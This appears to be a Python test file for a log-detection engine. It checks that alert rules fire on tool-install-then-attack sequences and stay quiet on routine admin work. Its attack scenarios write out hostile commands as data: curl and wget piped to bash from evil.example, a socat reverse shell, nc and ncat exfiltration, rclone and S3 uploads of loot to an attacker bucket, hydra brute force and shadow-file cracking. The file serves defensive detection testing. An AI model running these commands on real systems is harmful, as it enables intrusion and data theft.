from __future__ import annotations
import sys
import time
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent

from tests.coverage.credential_access_helper import CoverageScenario


def _pkg_evt(ts, package, *, host="tool-host", source="dpkg", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action="pkg_install",
        outcome="success",
        process="pkg-install",
        message=f"install {package}",
        fields={"package": package, "cmdline": f"install {package}"},
        distro_family=distro_family,
    )


def _proc_evt(
    ts,
    cmdline,
    *,
    host="tool-host",
    user="root",
    process=None,
    source="journald",
    action="process_exec",
    outcome="success",
    fields=None,
    distro_family="unknown",
):
    merged_fields = {"cmdline": cmdline}
    if fields:
        merged_fields.update(fields)
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action=action,
        outcome=outcome,
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields=merged_fields,
        distro_family=distro_family,
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="install-then-nmap-scan",
            events=[
                _pkg_evt(now + 1, "nmap", host="tool-attack-01", source="dnf"),
                _proc_evt(now + 21, "nmap -sV 203.0.113.10", host="tool-attack-01", process="nmap"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-ncat-egress",
            events=[
                _pkg_evt(now + 2, "ncat", host="tool-attack-02"),
                _proc_evt(now + 22, "ncat 198.51.100.10 4444 < /tmp/loot.bin", host="tool-attack-02", process="ncat"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-socat-reverse",
            events=[
                _pkg_evt(now + 3, "socat", host="tool-attack-03"),
                _proc_evt(now + 23, "socat TCP:198.51.100.11:4444 EXEC:/bin/sh", host="tool-attack-03", process="socat"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-tcpdump-capture",
            events=[
                _pkg_evt(now + 4, "tcpdump", host="tool-attack-04", source="rpm"),
                _proc_evt(now + 24, "tcpdump -i eth0 -w /tmp/creds.pcap", host="tool-attack-04", process="tcpdump"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-hydra-bruteforce",
            events=[
                _pkg_evt(now + 5, "hydra", host="tool-attack-05"),
                _proc_evt(now + 25, "hydra -l root -P /tmp/pass.txt ssh://203.0.113.12", host="tool-attack-05", process="hydra"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-john-crack",
            events=[
                _pkg_evt(now + 6, "john", host="tool-attack-06"),
                _proc_evt(now + 26, "john /tmp/shadow.txt", host="tool-attack-06", process="john"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-curl-pipe",
            events=[
                _pkg_evt(now + 7, "curl", host="tool-attack-07"),
                _proc_evt(now + 27, "curl http://evil.example/p.sh | bash", host="tool-attack-07", process="curl"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-wget-pipe",
            events=[
                _pkg_evt(now + 8, "wget", host="tool-attack-08"),
                _proc_evt(now + 28, "wget -qO- http://evil.example/p.sh | bash", host="tool-attack-08", process="wget"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-rclone-transfer",
            events=[
                _pkg_evt(now + 9, "rclone", host="tool-attack-09"),
                _proc_evt(now + 29, "rclone copy /tmp/loot.tgz remote:loot", host="tool-attack-09", process="rclone"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-sshpass-rsync",
            events=[
                _pkg_evt(now + 10, "sshpass", host="tool-attack-10"),
                _proc_evt(now + 30, "sshpass -p badpass rsync /tmp/loot.tgz root@198.51.100.13:/tmp/loot.tgz", host="tool-attack-10", process="sshpass"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-tmux-session",
            events=[
                _pkg_evt(now + 11, "tmux", host="tool-attack-11"),
                _proc_evt(now + 31, "tmux new-session -d '/bin/bash -c \"curl http://evil/p.sh | bash\"'", host="tool-attack-11", process="tmux"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-screen-detach",
            events=[
                _pkg_evt(now + 12, "screen", host="tool-attack-12"),
                _proc_evt(now + 32, "screen -dm /bin/bash -c 'curl http://evil/p.sh | bash'", host="tool-attack-12", process="screen"),
            ],
            expected_ids={"PKG-011", "SEQ-051"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="install-then-aws-s3-transfer",
            events=[
                _pkg_evt(now + 13, "awscli", host="tool-attack-13"),
                _proc_evt(now + 33, "aws s3 cp /tmp/loot.tgz s3://attacker-bucket/loot.tgz", host="tool-attack-13", process="aws"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="debian-install-then-netcat-openbsd-egress",
            events=[
                _pkg_evt(now + 14, "netcat-openbsd", host="tool-attack-14", source="dpkg", distro_family="debian"),
                _proc_evt(now + 34, "nc 198.51.100.14 4444 < /tmp/loot.bin", host="tool-attack-14", process="nc", distro_family="debian"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-install-then-nmap-ncat-egress",
            events=[
                _pkg_evt(now + 15, "nmap-ncat", host="tool-attack-15", source="dnf", distro_family="rhel"),
                _proc_evt(now + 35, "ncat 198.51.100.15 5555 < /tmp/loot.bin", host="tool-attack-15", process="ncat", distro_family="rhel"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-install-then-python3-awscli-transfer",
            events=[
                _pkg_evt(now + 16, "python3-awscli", host="tool-attack-16", source="zypper", distro_family="suse"),
                _proc_evt(now + 36, "aws s3 cp /tmp/loot.tgz s3://attacker-bucket/loot.tgz", host="tool-attack-16", process="aws", distro_family="suse"),
            ],
            expected_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="package-maintenance-upgrade",
            events=[
                _pkg_evt(now + 101, "packagekit", host="tool-benign-01"),
                _proc_evt(now + 121, "apt-get upgrade -y", host="tool-benign-01", process="apt-get"),
            ],
            expected_ids=set(),
            forbidden_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="unattended-upgrades",
            events=[
                _pkg_evt(now + 102, "wget", host="tool-benign-02"),
                _proc_evt(now + 122, "unattended-upgrades --dry-run", host="tool-benign-02", process="unattended-upgrades"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="packagekit-maintenance",
            events=[
                _pkg_evt(now + 103, "curl", host="tool-benign-03"),
                _proc_evt(now + 123, "packagekit status", host="tool-benign-03", process="packagekitd"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="config-management-after-install",
            events=[
                _pkg_evt(now + 104, "curl", host="tool-benign-04"),
                _proc_evt(now + 124, "ansible-playbook maintenance.yml", host="tool-benign-04", process="ansible-playbook"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="preset-maintenance-after-install",
            events=[
                _pkg_evt(now + 105, "wget", host="tool-benign-05"),
                _proc_evt(now + 125, "systemctl preset apt-daily.timer", host="tool-benign-05", process="systemctl"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="aws-configure-after-install",
            events=[
                _pkg_evt(now + 106, "awscli", host="tool-benign-06"),
                _proc_evt(now + 126, "aws configure --profile admin", host="tool-benign-06", process="aws"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="aws-sync-after-install",
            events=[
                _pkg_evt(now + 107, "awscli", host="tool-benign-07"),
                _proc_evt(now + 127, "aws s3 sync /tmp/diag s3://corp-backup/diag --profile admin", host="tool-benign-07", process="aws"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="aws-cp-admin-profile-after-install",
            events=[
                _pkg_evt(now + 108, "awscli", host="tool-benign-08"),
                _proc_evt(now + 128, "aws s3 cp /tmp/session-report.txt s3://corp-admin-report/session-report.txt --profile admin", host="tool-benign-08", process="aws"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="aws-backup-path-after-install",
            events=[
                _pkg_evt(now + 109, "awscli", host="tool-benign-09"),
                _proc_evt(now + 129, "aws s3 cp /var/backups/nightly.tgz s3://corp-backup/nightly.tgz", host="tool-benign-09", process="aws"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="benign-admin-install-package",
            events=[
                _pkg_evt(now + 110, "packagekit", host="tool-benign-10", source="dnf"),
                _proc_evt(now + 130, "dnf upgrade -y", host="tool-benign-10", process="dnf"),
            ],
            expected_ids=set(),
            forbidden_ids={"PKG-011", "SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="debian-install-then-unattended-upgrades",
            events=[
                _pkg_evt(now + 111, "curl", host="tool-benign-11", source="dpkg", distro_family="debian"),
                _proc_evt(now + 131, "unattended-upgrades --dry-run", host="tool-benign-11", process="unattended-upgrades", distro_family="debian"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-install-then-subscription-refresh",
            events=[
                _pkg_evt(now + 112, "curl", host="tool-benign-12", source="dnf", distro_family="rhel"),
                _proc_evt(now + 132, "subscription-manager refresh", host="tool-benign-12", process="subscription-manager", distro_family="rhel"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-install-then-transactional-patch",
            events=[
                _pkg_evt(now + 113, "wget", host="tool-benign-13", source="zypper", distro_family="suse"),
                _proc_evt(now + 133, "transactional-update patch", host="tool-benign-13", process="transactional-update", distro_family="suse"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-051", "SEQ-058"},
            kind="benign",
        ),
    ]
